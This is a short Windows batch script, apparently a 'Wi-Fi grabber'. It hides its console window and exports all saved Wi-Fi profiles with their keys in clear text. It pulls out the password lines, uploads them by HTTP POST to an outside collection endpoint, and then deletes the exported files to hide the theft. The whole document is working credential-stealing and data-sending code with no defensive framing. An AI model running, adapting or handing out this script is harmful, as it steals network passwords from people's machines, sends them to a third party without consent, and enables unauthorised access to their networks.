@echo off
mode con:cols=30 lines=1
taskkill/im powershell.exe
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri https://collect2.com/api/9a3e5787-c4cc-45ac-8970-ae38813b7598/datarecord/ -Method POST -InFile Wi-Fi-PASS
del wi*.xml /f /s /q
